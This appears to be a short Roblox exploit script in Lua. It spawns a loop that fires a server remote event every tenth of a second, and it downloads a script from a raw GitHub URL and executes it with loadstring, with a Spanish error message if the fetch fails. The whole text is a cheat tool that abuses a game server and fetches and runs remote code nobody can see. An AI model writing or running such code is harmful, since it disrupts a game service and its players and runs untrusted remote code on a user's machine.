local spamThread = spawn(function()
   while wait(0.1) do
      workspace.Plots.Plot1.Shelf.Info:FireServer()
   end
end)

local success, script = pcall(function()
   return game:HttpGet("https://raw.githubusercontent.com/AnonyProArg/ScriptsRobloz/main/Pasteler%C3%ADa/ExeC1.lua")
end)

if success then
   loadstring(script)()
else
   print("Error al obtener el script desde la URL")
end
